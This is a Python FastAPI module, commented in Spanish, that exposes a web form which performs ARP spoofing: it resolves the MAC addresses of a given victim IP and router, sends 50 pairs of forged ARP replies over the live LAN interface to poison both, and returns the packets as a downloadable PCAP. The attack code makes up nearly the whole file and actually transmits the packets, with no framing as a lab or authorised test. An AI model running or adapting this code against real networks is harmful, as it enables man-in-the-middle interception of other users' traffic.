import subprocess
import sys
import os
import re
import tempfile
import scapy.all as scapy

from fastapi import FastAPI, UploadFile, File, HTTPException, Query, APIRouter, Request, Form
from fastapi.responses import FileResponse, HTMLResponse
from fastapi.templating import Jinja2Templates

router = APIRouter()
templates = Jinja2Templates(directory="app/templates")

# Cambia esto por tu interfaz adecuada (la que tiene tu IP LAN)

def detect_physical_iface():
    """
    Devuelve automáticamente la interfaz Npcap
    que tenga dirección IP en una red privada.
    Funciona para cualquier IP y cualquier interfaz física.
    """
    private_prefixes = ("192.168.", "10.", "172.")

    for iface in scapy.get_if_list():
        try:
            ip = scapy.get_if_addr(iface)
            if ip.startswith(private_prefixes):
                return iface
        except:
            pass
    return None

# ------------------------------------------------------------
# Obtener MAC usando ARP request + fallback a tabla ARP Windows
# ------------------------------------------------------------
def get_mac(ip, iface):
    print(f"[*] Resolviendo MAC de {ip} ...")

    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    ans = scapy.srp(pkt, iface=iface, timeout=2, verbose=False)[0]

    if ans:
        mac = ans[0][1].hwsrc
        return mac

    output = subprocess.check_output("arp -a", text=True)
    for line in output.splitlines():
        if ip in line:
            mac = line.split()[1].replace("-", ":")
            return mac

    # print(f"[!] No se pudo obtener la MAC de {ip}")
    return None


# ------------------------------------------------------------
# ARP Spoof Correcto (Ethernet + ARP)
# ------------------------------------------------------------
def build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac):
    # Paquete que engaña a la víctima fingiendo ser el router
    pkt_to_victim = scapy.Ether(dst=victim_mac) / scapy.ARP(
        op=2,
        psrc=router_ip,
        pdst=victim_ip,
        hwdst=victim_mac
    )

    # Paquete que engaña al router fingiendo ser la víctima
    pkt_to_router = scapy.Ether(dst=router_mac) / scapy.ARP(
        op=2,
        psrc=victim_ip,
        pdst=router_ip,
        hwdst=router_mac
    )

    return pkt_to_victim, pkt_to_router


# ------------------------------------------------------------
# Generación de PCAP y envío continuo hasta Ctrl+C
# ------------------------------------------------------------
def generate_pcap(victim_ip, router_ip, iface):
    victim_mac = get_mac(victim_ip, iface)
    router_mac = get_mac(router_ip, iface)

    if not victim_mac or not router_mac:
        raise RuntimeError("No se pudieron obtener todas las MAC.")

    print("[*] Iniciando ataque ARP... Ctrl+C para detener.")

    packets = []
    i = 0
    while i < 50:
        pkt_v, pkt_r = build_spoof_packets(victim_ip, victim_mac, router_ip, router_mac)

        scapy.sendp(pkt_v, iface=iface, verbose=False)
        scapy.sendp(pkt_r, iface=iface, verbose=False)

        packets.append(pkt_v)
        packets.append(pkt_r)
        i += 1
    
    return packets


# ----------------------------------------
#  Endpoints FastAPI
# ----------------------------------------

@router.get("/op_arp", response_class=HTMLResponse, tags=["op_arp"])
async def cargar_pagina_portscan(request: Request):
        return templates.TemplateResponse("arp.html", {"request": request})
    

@router.post("/op_arp", response_class=FileResponse, tags=["op_arp"])
async def mutar_pcap(
    ip_victima: str = Form(None, description="IP victima"),
    ip_router: str = Form(None, description="IP router")
):
    """Recibe un pcap, genera un nuevo pcap 'de ataque' y lo devuelve."""
    
    # Crear archivo de salida temporal
    out_fd, out_path = tempfile.mkstemp(suffix=".pcap")
    os.close(out_fd)
    
    iface = detect_physical_iface()
    if iface is None:
        raise HTTPException(status_code=500, detail="No se detectó una interfaz de red válida.")
    try:
        paquetes = generate_pcap(ip_victima, ip_router, iface)
        
        if not paquetes:
                raise HTTPException(status_code=400, detail="No se generaron paquetes.")
            
        # Guardar PCAP en el archivo temporal
        scapy.wrpcap(out_path, paquetes)
        
        # Devolvemos el archivo generado
        return FileResponse(
            out_path,
            media_type="application/vnd.tcpdump.pcap",
            filename=f"arp_spoofing.pcap",
        )
    except RuntimeError as e:
        # errores de nuestra lógica
        raise HTTPException(status_code=500, detail=str(e))